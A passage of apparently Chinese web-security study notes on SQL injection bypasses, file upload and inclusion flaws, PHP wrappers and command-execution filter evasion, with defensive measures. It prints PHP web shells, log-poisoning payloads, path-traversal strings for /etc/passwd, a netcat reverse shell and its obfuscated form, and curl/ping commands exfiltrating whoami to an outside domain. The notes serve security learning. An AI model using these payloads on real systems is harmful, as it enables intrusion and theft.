码）</li><li>十六进制：<code>&#39;users&#39;</code>==<code>0x7573657273 / database()</code> 代替 ‘name’</li><li>Unicode编码：<code>%u006c</code></li><li>ASCII码：<code>CHAR( 100 )</code></li></ol><ul><li>等价字符<ol><li>like 或 in 代替 =</li><li>逗号替换：<code>select substr(database(),1,1)</code> 换成 <code>select substr(database() from 1 for 1)</code></li></ol></li><li>等价函数<ol><li><code>sleep</code> == <code>benchmark</code></li><li><code>ascii</code> == <code>hex，bin</code></li><li><code>group_concat</code> == <code>concat_ws</code></li><li><code>updatexml</code> == <code>extractvalue</code></li><li>字符串截取函数：<code>mid、substr、substring、left、reverse</code></li></ol></li></ul><h3 id="9-SQL加固防护"><a href="#9-SQL加固防护" class="headerlink" title="9 SQL加固防护"></a>9 SQL加固防护</h3><h4 id="9-1-数字型"><a href="#9-1-数字型" class="headerlink" title="9.1 数字型"></a>9.1 数字型</h4><p><code>int intval( mixed $var [ , int $base = 10 ] )</code>：进制转化<br>（base：0（自动检测）、其他为其他进制）</p><h4 id="9-2-字符型"><a href="#9-2-字符型" class="headerlink" title="9.2 字符型"></a>9.2 字符型</h4><ul><li><p>htmlspecialchars( str )</p><blockquote><p>把预定义字符转化成 html 实体（默认不对单引号转化，要加  ENT_QUOTES 参数才会转化</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>字符</th><th>转义</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;amp</td></tr><tr><td>“</td><td>&amp;quot</td></tr><tr><td>‘</td><td>&amp;#039</td></tr><tr><td>&lt;</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>&amp;gt</td></tr></tbody></table></div><ul><li><p>mysql_real_escape_string( str )</p><blockquote><p>对 sql 语句中 str 使用的特殊字符进行转义（\0x00、\n、\r、’、”、\x1a）。<br>成功转义返回字符串，否则返回 false。<br>PHP4.3.0以上才可使用，PHP5.3中已经弃用了</p></blockquote></li><li><p>addslashes( str )</p><blockquote><p>预定义字符前加反斜杠，返回字符</p><p>预定义字符：’、”、\、null</p></blockquote></li></ul><h4 id="9-3-参数化查询"><a href="#9-3-参数化查询" class="headerlink" title="9.3 参数化查询"></a>9.3 参数化查询</h4><ul><li>mysqli：( name = ? )</li><li>PDO：( name = : username )</li></ul><h4 id="9-4-服务器配置"><a href="#9-4-服务器配置" class="headerlink" title="9.4 服务器配置"></a>9.4 服务器配置</h4><ul><li><p>magic_quotes_gpc = on</p><blockquote><p>自动转义预定义字符（addslashes函数），自 PHP5.3.0 起废弃并自 PHP5.4.0 移除。</p></blockquote></li><li><p>magic_quotes_sybase = on</p><blockquote><p>单引号会转义成两个单引号。（须开始 magic_quotes_gpc 和 magic_quotes_sybase 才生效）</p></blockquote></li></ul><hr><h2 id="※二、：身份认证攻击"><a href="#※二、：身份认证攻击" class="headerlink" title="※二、：身份认证攻击"></a>※二、：身份认证攻击</h2><hr><h2 id="三、文件上传漏洞"><a href="#三、文件上传漏洞" class="headerlink" title="三、文件上传漏洞"></a>三、文件上传漏洞</h2><h3 id="1-文件本身绕过"><a href="#1-文件本身绕过" class="headerlink" title="1 文件本身绕过"></a>1 文件本身绕过</h3><h4 id="1-1-JS过滤绕过"><a href="#1-1-JS过滤绕过" class="headerlink" title="1.1 JS过滤绕过"></a>1.1 JS过滤绕过</h4><ul><li><p>代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext=<span class="string">&quot;.jpg | .jpeg | .png | .gif | .bmp</span></span><br><span class="line"><span class="string">if (allow_ext.indexOf(ext_name + &quot;</span>|<span class="string">&quot;) == -1 )</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Error!; </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>绕过：</p><ol><li><p>先把木马扩展名改成 .jpg ，再抓包改成 .php</p></li><li><p>修改 js 代码</p></li><li><p>禁用 js 代码</p><blockquote><p>Edge：设置——搜索JavaScript——禁用</p></blockquote></li></ol></li></ul><h4 id="1-2-文件名绕过"><a href="#1-2-文件名绕过" class="headerlink" title="1.2 文件名绕过"></a>1.2 文件名绕过</h4><ul><li><p><code>if($type == &quot;php&quot;)</code>：大小写绕过（phP、PhP、php3、phtml）（双写：phphpp）</p></li><li><p>常见 Content-Type 类型</p></li></ul><div class="table-container"><table><thead><tr><th>值</th><th>格式</th></tr></thead><tbody><tr><td>text/html</td><td>HTML格式</td></tr><tr><td>text/plain</td><td>纯文本格式</td></tr><tr><td>text/xml</td><td>XML格式</td></tr><tr><td>image/gif</td><td>gif图片格式</td></tr><tr><td>image/jpeg</td><td>jpg图片格式</td></tr><tr><td>image/png</td><td>png图片格式</td></tr><tr><td>application/xml</td><td>XML数据格式</td></tr><tr><td>application/json</td><td>JSON数据格式</td></tr><tr><td>application/pdf</td><td>pdf格式</td></tr><tr><td>application/msword</td><td>Word文档格式</td></tr><tr><td>application/octet-stream</td><td>二进制流数据（PHP）</td></tr></tbody></table></div><ul><li>常见文件头</li></ul><div class="table-container"><table><thead><tr><th>文件</th><th>文件头</th></tr></thead><tbody><tr><td>JPEG</td><td>0xFFD8FF</td></tr><tr><td>PNG</td><td>0x89504E470D0A1A0A</td></tr><tr><td>GIF</td><td>47 49 46 38 39 61 （或直接在 txt 前加上 GIF89a）</td></tr></tbody></table></div><ul><li><p>木马</p><p><code>GIF89a&lt;?php @eval($_REQUEST[123]); ?&gt;</code>（绕过函数 exif_imagetype）</p></li><li><p>隐藏文件</p><p><code>copy 111.jpg /b + a.txt /a test.php</code>（类型会检测的话再修改类型）</p></li></ul><h4 id="1-3-文件截断上传"><a href="#1-3-文件截断上传" class="headerlink" title="1.3 文件截断上传"></a>1.3 文件截断上传</h4><ol><li><p>PHP &lt; 5.3.4</p></li><li><p>magic_quotes_gpc = off</p></li><li><p>传文件的路径可控</p><blockquote><p>然后在上传的文件前改一个字符为%00，后面的 php 文件就不会被处理。</p></blockquote></li></ol><h3 id="2-其他文件绕过"><a href="#2-其他文件绕过" class="headerlink" title="2 其他文件绕过"></a>2 其他文件绕过</h3><h4 id="2-1-htaccess文件上传"><a href="#2-1-htaccess文件上传" class="headerlink" title="2.1 .htaccess文件上传"></a>2.1 .htaccess文件上传</h4><blockquote><p>原理：.htaccess文件是Web服务器的一个配置文件，可以配置文件的解析方式、重定向等配置。</p></blockquote><ul><li><p>开启配置</p><ol><li>Options FollowSymLinks AllowOverride None 改 All</li><li>LoadModule rewrite_module modules/mod_rewrite.so（去掉注释，开启 rewrite 模块）</li></ol></li><li><p>文件配置</p><ol><li><p>指定文件名</p><p><code>&lt;Files test.jpg&gt;ForceType application/x-httpd-php SetHandler application/x-httpd-php&lt;/Files&gt;</code></p></li><li><p>指定文件后缀</p><p><code>AddType application/x-httpd-php .jpg</code></p></li></ol></li><li><p>利用流程</p><ol><li>构造 .htaccess 文件：内容是文件配置（在windows上无法直接创建，因为无文件名。可以先创建一个有文件名的文件，之后抓包删去）</li><li>构造图片木马文件：copy .jpg /b + .txt .jpg</li><li>上传 .htaccess 和木马文件完成攻击。</li></ol></li></ul><h4 id="2-2-user-ini"><a href="#2-2-user-ini" class="headerlink" title="2.2 .user.ini"></a>2.2 .user.ini</h4><blockquote><p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html">.user.ini</a></p><p>同理 .htaccess</p><p>自动包含jpg到同目录下的php中：auto_prepend_file=flag.jpg</p></blockquote><h4 id="2-3-竞争条件上传"><a href="#2-3-竞争条件上传" class="headerlink" title="2.3 竞争条件上传"></a>2.3 竞争条件上传</h4><blockquote><p>原理：在上传的文件未被消灭之前进行访问，从而生成新的文件存在文件夹中。之后访问新的文件夹便可进行漏洞利用。</p><p>木马：<code>&lt;?php fputs(fopen(&quot;shell.php&quot; , &quot;w&quot;) , &quot;&lt;?php @eval($_POST[123]) ; ? &gt;&quot;)&gt;</code><br>（原理：创建一个 shell.php 文件，内容为后面的字符串）</p><p>攻击：BP——Intruder——Sniper——Payloads——Null payloads &amp;&amp; Generate:10000（抓两个包，一个上传文件，一个访问文件，和服务器竞争）</p></blockquote><h3 id="3-字符绕过"><a href="#3-字符绕过" class="headerlink" title="3 字符绕过"></a>3 字符绕过</h3><h4 id="3-1-短标签绕过"><a href="#3-1-短标签绕过" class="headerlink" title="3.1 短标签绕过"></a>3.1 短标签绕过</h4><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-415762.html">短标签绕过原理</a></p><p>“&lt;?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。</p><p>PHP.ini——short_open_tag=On。（但是，从PHP版本5.4.0开始，无论PHP.ini文件中的设置如何，都可以使用短标签。）</p><p>例：<code>&lt;?=eval($_POST[&#39;cmd&#39;]; ?)&gt;</code></p></blockquote><h3 id="4-防护"><a href="#4-防护" class="headerlink" title="4 防护"></a>4 防护</h3><ol><li>使用白名单限制文件上传的类型。</li><li>对上传文件进行随机重命名，并且文件的扩展名不允许用户自定义。</li><li>对保存上传的文件的文件夹进行权限限制，去掉脚本的执行权限。（让上传的文件不可以被执行）</li><li>对文件的内容进行恶意代码检测。</li></ol><hr><h2 id="※四、文件下载漏洞"><a href="#※四、文件下载漏洞" class="headerlink" title="※四、文件下载漏洞"></a>※四、文件下载漏洞</h2><hr><h2 id="五、文件包含漏洞"><a href="#五、文件包含漏洞" class="headerlink" title="五、文件包含漏洞"></a>五、文件包含漏洞</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>文件包含函数的参数没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可以包含非预期的文件。</p><p>include / include_once / require / require_once</p></blockquote><ul><li><p>特征</p><ul><li>?page=a.php</li><li>?home=b.html</li><li>?file=content</li></ul></li><li><p>路径</p><ul><li>Windows：<ul><li>c:\boot.ini【系统版本信息】</li><li>c:\xxx\php.ini【PHP配置信息】</li><li>c:\xxx\my.ini【MySQL配置信息】</li><li>c:\xxx\httpd.conf【Apache配置信息】</li></ul></li><li>Linux：<ul><li>/etc/passwd【Linux系统账号信息】</li><li>/etc/httpd/conf/httpd.conf【Apache配置信息】</li><li>/etc/my.conf【MySQL配置信息】</li><li>/usr/etc/php.ini【PHP配置信息】</li></ul></li></ul></li></ul><h3 id="2-本地包含"><a href="#2-本地包含" class="headerlink" title="2 本地包含"></a>2 本地包含</h3><ul><li><p>无限制</p><blockquote><p><code>?filename=../../../../../../../../../../../../etc/passwd</code></p></blockquote></li><li><p>有限制</p><ol><li><p>%00截断（截断后面的扩展名）</p><blockquote><p>条件：magic_quotes_gpc=off，V（PHP）&lt; 5.3.4</p></blockquote></li><li><p>路径长度截断</p><blockquote><p>Windows路径最长 256B，Linux 4096B（限 32 位）</p><p><code>?filename=test.txt./././././</code> * 256B （截断）</p></blockquote></li><li><p>点号截断</p><blockquote><p>同理 2</p><p><code>?fliename=test.txt.................</code></p></blockquote></li></ol></li></ul><h3 id="3-系统文件包含"><a href="#3-系统文件包含" class="headerlink" title="3 系统文件包含"></a>3 系统文件包含</h3><ul><li><p>Session文件<br>Linux：/var/lib/php/session（服务器存 session 格式：sess_id）</p><ol><li><code>?filename=&lt;?php phpinfo(); ?&gt;</code>（要编码）</li><li>利用 F12 找到 session 值</li><li>?filename=/var/lib/php/sess_id（访问成功表示成功）</li></ol></li><li><p>日志文件</p><ul><li><p>中间件日志</p><blockquote><p>条件是已知路径，且有可读权限。（ CentOS 的 Apache 日志在 /var/log/httpd，默认名 access_log ）</p><p><code>&lt;?php @eval($_POST[123])?&gt;</code>：抓包改编码（URL编码导致无法使用）</p><p>访问路径，key 是 123</p></blockquote></li><li><p>SSH日志：</p><blockquote><p>路径已知，可读。（ /var/log/auth.log ）</p><p><code>ssh &quot;&lt;?php @eval($_POST[123])?&gt;&quot;@ip</code></p><p>访问，key 是 123</p></blockquote></li></ul></li><li><p>远程文件</p><ul><li><p>原理</p><blockquote><p>包含其他服务器的文件（是其他服务器的执行结果发给新服务器）</p></blockquote></li><li><p>条件：allow_url_fopen = on 和 allow_url_include = on</p><p><code>?filename=http://ip/php.txt</code></p></li><li><p>绕过（截断后面的扩展名）</p><ol><li>问号，php.txt?</li><li>井号，php.txt%23</li><li>空格，php.txt%20</li></ol></li></ul></li></ul><h3 id="4-PHP常用伪协议"><a href="#4-PHP常用伪协议" class="headerlink" title="4 PHP常用伪协议"></a>4 PHP常用伪协议</h3><h4 id="4-1-filter"><a href="#4-1-filter" class="headerlink" title="4.1 filter"></a>4.1 filter</h4><blockquote><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter</a></p><p><a href="https://www.cnblogs.com/niyani/p/16954041.html">绕过</a>     <a href="https://www.coder.work/article/156675">iconv编码列表</a></p></blockquote><ul><li><p>作用</p><blockquote><p>访问本地文件系统。（无条件）</p><p>[read=] / [write=]</p><p>对数据进行读取。在include后如果不编码，文件内容将会被包含到当前文件中，然后作为代码执行，而编码后包含进来的代码不可被执行了，所以会显示出来。</p></blockquote></li><li><p>代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读文件的base64编码（不加解码的话就是执行php）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/[read=]convert.base64-encode/resource=xxx.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码（用于绕过base64编码禁止）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=xxx.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;/resource=xxx.php</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="4-2-input"><a href="#4-2-input" class="headerlink" title="4.2 input"></a>4.2 input</h4><ul><li><p>作用</p><blockquote><p>读取POST上没有经过解析的原始数据。</p></blockquote></li><li><p>限制</p><blockquote><p>使用 enctype=”multipart/form-data” 该伪协议无效。</p></blockquote></li></ul><ol><li><p>读取 post 数据（无条件）</p><blockquote><ul><li>上传文件：<code>&lt;?php echo file_get_contents(&quot;php://input&quot;)&gt;;/post.php</code></li><li>post操作：<code>data</code>，回显 data</li></ul></blockquote></li><li><p>写木马（allow_url_include开启）</p><blockquote><ul><li>上传文件：<code>filename=php://input</code></li><li>post操作：<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li></ul></blockquote></li><li><p>执行命令（allow_url_include开启）</p><blockquote><ul><li><p>上传文件：<code>filename=php://input</code></p></li><li><p>post操作：<code>system</code></p></li></ul></blockquote></li></ol><h4 id="4-3-file"><a href="#4-3-file" class="headerlink" title="4.3 file"></a>4.3 file</h4><ul><li><p>作用</p><blockquote><p>访问本地系统文件，读取文件内容。（无条件）</p></blockquote></li><li><p>代码</p><blockquote><p><code>?filename=file://c:/boot.ini</code></p></blockquote></li></ul><h4 id="4-4-data"><a href="#4-4-data" class="headerlink" title="4.4 data"></a>4.4 data</h4><ul><li><p>作用</p><blockquote><p>读取数据，传入代码的话代码就会被执行。</p><p>allow_url_fopen 和 allow_url_include 开启</p></blockquote></li><li><p>代码</p><blockquote><p><code>?filename=data://text/plain;base64,&lt;data&gt;</code></p><p>data是base64编码后数据</p></blockquote></li><li><p>例</p><blockquote><p><code>data=PD9waHAgcGhwaW5mbygpOz8%2b</code>（<code>&lt;?php phpinfo();?&gt;</code>）</p></blockquote></li></ul><h4 id="4-5-phar"><a href="#4-5-phar" class="headerlink" title="4.5 phar"></a>4.5 phar</h4><ul><li><p>作用</p><blockquote><p>解压，无论什么扩展名都会被当成压缩包。</p><p>allow_url_fopen 和 allow_url_include 开启</p></blockquote></li><li><p>代码</p><blockquote><p><code>?file=phar://压缩包/内部文件</code></p></blockquote></li><li><p>例</p><blockquote><p><code>?file=phar://shell.png/shell.php</code></p></blockquote></li></ul><h4 id="4-6-zip"><a href="#4-6-zip" class="headerlink" title="4.6 zip"></a>4.6 zip</h4><ul><li><p>作用</p><blockquote><p>同理 phar，用法不同。</p></blockquote></li><li><p>代码</p><blockquote><p><code>?file=zip://[压缩文件绝对路径] # [子文件名]</code></p></blockquote></li><li><p>例</p><blockquote><p><code>?file=zip://shell.png%23shell.php</code></p></blockquote></li></ul><h4 id="4-7-expect"><a href="#4-7-expect" class="headerlink" title="4.7 expect"></a>4.7 expect</h4><ul><li><p>作用</p><blockquote><p>处理交互式流。主要用来执行系统命令，需要装扩展。</p></blockquote></li><li><p>例</p><blockquote><p><code>?file=expect://ls</code></p></blockquote></li></ul><h3 id="5-PHP不常用伪协议"><a href="#5-PHP不常用伪协议" class="headerlink" title="5 PHP不常用伪协议"></a>5 PHP不常用伪协议</h3><ul><li><p>http</p><blockquote><p>作用：访问 http(s) url。</p></blockquote></li><li><p>ftp</p><blockquote><p>作用：访问 ftp(s) url。</p></blockquote></li><li><p>php</p><blockquote><p>作用：访问各个输入输出流。</p></blockquote></li><li><p>zlib</p><blockquote><p>作用：处理压缩流。</p></blockquote></li><li><p>glob</p><blockquote><p>作用：查找匹配的文件路径模式。</p></blockquote></li><li><p>ssh2</p><blockquote><p>作用：Secure Shell 2。</p></blockquote></li><li><p>rar</p><blockquote><p>作用：RAR数据压缩</p></blockquote></li><li><p>ogg</p><blockquote><p>作用：处理音频流。</p></blockquote></li></ul><h3 id="6-防护"><a href="#6-防护" class="headerlink" title="6 防护"></a>6 防护</h3><ul><li><p>代码层</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;home&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span> .<span class="variable">$filename</span> .<span class="string">&#x27;.php&#x27;</span>;<span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li><li><p>配置</p><ol><li>包含特定目录：<code>open_basedir=/var/www/html/</code>。（最后一个 / 要加）</li><li>关闭 all_url_include。</li></ol></li></ul><hr><h2 id="六、命令执行漏洞"><a href="#六、命令执行漏洞" class="headerlink" title="六、命令执行漏洞"></a>六、命令执行漏洞</h2><h3 id="1-php函数"><a href="#1-php函数" class="headerlink" title="1 php函数"></a>1 php函数</h3><blockquote><p><a href="https://blog.csdn.net/figli/article/details/41007573">proc_open</a>   </p><p><a href="https://cloud.tencent.com/developer/section/1344774">stream_get_contents</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行外部程序并输出。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">array</span> &amp;<span class="variable">$output</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return</span> _var]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># shell 执行，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序并显示原始输出。    </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">passthru</span>( <span class="keyword">string</span> <span class="variable">$command</span> [ , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开进程文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">popen</span>( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;touch test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="meta">?&gt;</span> <span class="comment"># 可以在服务器中创建文件。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令，并打开用来输入输出的文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>,<span class="keyword">array</span> <span class="variable">$descriptorspec</span>,<span class="keyword">array</span> &amp;<span class="variable">$pipes</span>[,<span class="keyword">string</span> <span class="variable">$cmd</span>[,<span class="keyword">array</span> <span class="variable">$env</span> [,<span class="keyword">array</span> <span class="variable">$other_options</span>]]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$proc</span> = <span class="title function_ invoke__">poroc_open</span>(<span class="string">&quot;whoami&quot;</span>,<span class="keyword">array</span>( <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),<span class="variable">$pipes</span> );<span class="keyword">print</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将反引号作为 shell 命令尝试执行。</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>`whoami` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-Windows函数"><a href="#2-Windows函数" class="headerlink" title="2 Windows函数"></a>2 Windows函数</h3><blockquote><p><a href="..\..\Main\OS_Security\Windows操作系统.md">Windows操作系统</a>——Bat脚本——特殊字符。</p><p>&amp;：前后都执行。</p><p>|：仅执行最后（当参数）。</p></blockquote><h3 id="3-Linux函数"><a href="#3-Linux函数" class="headerlink" title="3 Linux函数"></a>3 Linux函数</h3><blockquote><p><a href="..\..\Main\OS_Security\Ubuntu LInux.md">Ubuntu Linux</a>——高级技巧——命令排列。</p><p>; ：所有命令都被执行。</p><p>&amp;：多条命令在后台执行。</p></blockquote><h3 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4 绕过"></a>4 绕过</h3><h4 id="4-1-空格绕过"><a href="#4-1-空格绕过" class="headerlink" title="4.1 空格绕过"></a>4.1 空格绕过</h4><blockquote><p><a href="https://liloong3t.com/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/"><script type="math/tex">IFS</script>9原理</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $&#123;IFS&#125;：shell 特殊环境变量，内部域分隔符，默认空白字符（空格，制表符和换行符等）</span></span><br><span class="line">cat$&#123;IFS&#125;<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">$IFS$<span class="number">9</span>，$IFS$<span class="number">1</span> <span class="comment"># 空格</span></span><br><span class="line"><span class="variable">$PS2</span> <span class="comment"># &gt;</span></span><br><span class="line"><span class="variable">$PS4</span> <span class="comment"># +</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url 编码，制表符代替空格。</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment"># &#123;&#125;</span></span><br><span class="line">&#123; cat , <span class="number">1</span>.php &#125;</span><br><span class="line"><span class="comment"># 重定向输入</span></span><br><span class="line">cat&lt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><h4 id="4-2-关键字绕过"><a href="#4-2-关键字绕过" class="headerlink" title="4.2 关键字绕过"></a>4.2 关键字绕过</h4><ul><li><p>变量赋值</p><blockquote><p>原理：php 变量可以转换成值后直接拼接成字符串。</p></blockquote><p><code>a=c;b=at;$a$b 1.php</code></p></li><li><p>空变量</p><blockquote><p>原理：空变量等于空。</p></blockquote><p><code>ca$&#123;x&#125;t 1.php</code></p></li><li><p>系统变量</p><blockquote><p>原理：系统变量自带值，直接提取系统变量中的值使用。</p><p> 查看系统值：<code>echo $&#123;SHELLOPTS&#125;</code></p></blockquote><p><code>$&#123;SHELLOPTS:3:1&#125;at 1.php</code></p></li><li><p>\绕过</p><blockquote><p>原理：换行输入。</p></blockquote><p><code>c\a\t 1.php</code></p></li><li><p>通配符</p><ul><li><p>0 - n 个字符。</p></li><li><p>?  一个任意字符。</p></li><li><p>[]  字符范围，表示该范围内任一字符。（例：[a~z]）</p><p><code>/etc/passwd：cat /???/???sw?</code></p></li></ul></li><li><p>shell反弹</p><blockquote><p>原理：让客户机连接自己，自己作为服务器。</p><p>IP绕过：IP转化为十进制。</p><p>建立服务器：<code>nc -lp port</code></p></blockquote><ul><li>原命令：<br><code>/bin/nc 192.168.91.138 8888 -e /bin/bash</code></li><li>绕过：<br><code>/b??/?c 3232258951 -e /???/b??h</code>（-e 默认关，需要改版本）</li></ul></li><li><p>base64</p><blockquote><p>原理：先编码再解码</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;aWQ=&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-3-其他绕过"><a href="#4-3-其他绕过" class="headerlink" title="4.3 其他绕过"></a>4.3 其他绕过</h4><blockquote><p><a href="https://github.com/BugScanTeam/DNSLog">DNSLog下载</a></p></blockquote><ul><li><p>expr &amp; awk</p><blockquote><p>原理：从其他文件中获得字符并进行命令构造</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">expr</span> substr $(awk NR=1 ctfs-wiki) 1 1</span><br></pre></td></tr></table></figure></li><li><p>无回显命令执行</p><blockquote><p>无法反弹 shell 可以 DNS 管道解析获得信息。</p></blockquote><ul><li><p>Linux 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl test.ctfs-wiki.com/ `<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure></li><li><p>Linux 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 whoami.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure></li><li><p>Windows 计算机名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> start http://test.ctfs-wiki.com/%x</span><br></pre></td></tr></table></figure></li><li><p>Windows 用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F <span class="string">&quot;delims=\ tokens=2&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> ping -n 1 %i.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure></li><li><p>网站用户名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://test.ctfs-wiki.com/?&quot;</span>`<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="5-防护"><a href="#5-防护" class="headerlink" title="5 防护"></a>5 防护</h3><blockquote><p><a href="https://blog.csdn.net/LYJ20010728/article/details/116902085">绕过防护</a></p></blockquote><ol><li>PHP配置文件 disable_functions 禁用敏感函数。</li><li><code>string escapeshellarg(string $arg)</code>：给字符串加一个单引号，存在的单引号会被转义。</li><li><code>string escapeshellcmd(string $command)</code>：特殊字符都会被转义。</li></ol><hr><h2 id="七、代码执行漏洞"><a href="#七、代码执行漏洞" class="headerlink" title="七、代码执行漏洞"></a>七、代码执行漏洞</h2><h3 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1 普通函数"></a>1 普通函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把字符串作为php代码执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 检查一个断言是否为FALSE</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>[,<span class="built_in">Throwable</span> <span class="variable">$exception</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> 